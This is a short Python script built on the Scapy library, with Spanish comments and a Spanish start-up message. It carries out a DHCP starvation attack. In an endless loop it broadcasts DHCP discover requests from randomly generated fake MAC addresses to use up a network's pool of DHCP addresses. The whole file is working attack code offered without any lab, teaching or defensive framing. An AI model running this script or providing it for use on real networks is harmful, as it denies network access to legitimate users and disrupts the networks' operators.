# -*- coding: utf-8 -*-
from scapy.all import *

def starvation():
    print("Iniciando ataque DHCP Starvation...")

    # Ignorar verificación de IP
    conf.checkIPaddr = False

    # Enviar paquetes en bucle infinito
    while True:
        fake_mac = RandMAC()

        # Capa Ethernet / IP / UDP / DHCP
        pkt = Ether(src=fake_mac, dst="ff:ff:ff:ff:ff:ff") / \
              IP(src="0.0.0.0", dst="255.255.255.255") / \
              UDP(sport=68, dport=67) / \
              BOOTP(chaddr=RandString(12, "0123456789abcdef")) / \
              DHCP(options=[("message-type", "discover"), "end"])

        sendp(pkt, verbose=0)

if __name__ == "__main__":
    starvation()
